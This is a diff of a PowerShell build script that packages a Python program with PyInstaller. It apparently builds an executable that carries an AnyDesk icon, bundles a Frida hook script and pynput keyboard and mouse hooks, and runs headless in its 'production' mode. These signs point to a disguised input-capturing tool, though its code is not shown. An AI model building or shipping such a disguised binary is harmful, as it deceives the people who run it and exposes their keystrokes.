@@ -59,20 +59,32 @@ if ($LASTEXITCODE -ne 0) {
 Write-Host "All requirements installed"
 Write-Host ""
 
-# Step 3: Clean Previous Builds
+# Step 3: Verify CustomTkinter
+Write-Host "Verifying CustomTkinter installation..."
+& $venvPython -c "import customtkinter; import os; print(os.path.dirname(customtkinter.__file__))" 2>$null
+if ($LASTEXITCODE -ne 0) {
+    Write-Host "ERROR: CustomTkinter not found in virtual environment"
+    Write-Host "Please ensure CustomTkinter is installed: pip install customtkinter"
+    Read-Host "Press Enter to exit"
+    exit 1
+}
+Write-Host "CustomTkinter found"
+Write-Host ""
+
+# Step 4: Clean Previous Builds
 Write-Host "Cleaning previous builds..."
 if (Test-Path "dist") { Remove-Item -Recurse -Force "dist" }
 if (Test-Path "build") { Remove-Item -Recurse -Force "build" }
-$specFile = "$ExeBaseName.spec"
-if (Test-Path $specFile) { Remove-Item -Force $specFile }
+# NOTE: We keep the spec file now (don't delete it)
 Write-Host "Build directories cleaned"
 Write-Host ""
 
-# Step 4: Build
+# Step 5: Build
 if ($Dev) {
     Write-Host "Building DEV mode with console"
     Write-Host ""
-    & $venvPython -m PyInstaller --onefile --console --name $ExeBaseName --icon assets/AnyDesk.ico --add-data "utils/frida_hook.js;utils" --add-data "assets;assets" --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 main.py
+    # Use spec file with --console flag to override default
+    & $venvPython -m PyInstaller AnyDeskClient.spec --console
     
     if ($LASTEXITCODE -ne 0) {
         Write-Host ""
@@ -100,7 +112,8 @@ if ($Dev) {
 } else {
     Write-Host "Building PRODUCTION mode headless"
     Write-Host ""
-    & $venvPython -m PyInstaller --onefile --noconsole --name $ExeBaseName --icon assets/AnyDesk.ico --add-data "utils/frida_hook.js;utils" --add-data "assets;assets" --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 main.py
+    # Use spec file with --noconsole flag (or rely on spec default)
+    & $venvPython -m PyInstaller AnyDeskClient.spec --noconsole
     
     if ($LASTEXITCODE -ne 0) {
         Write-Host ""
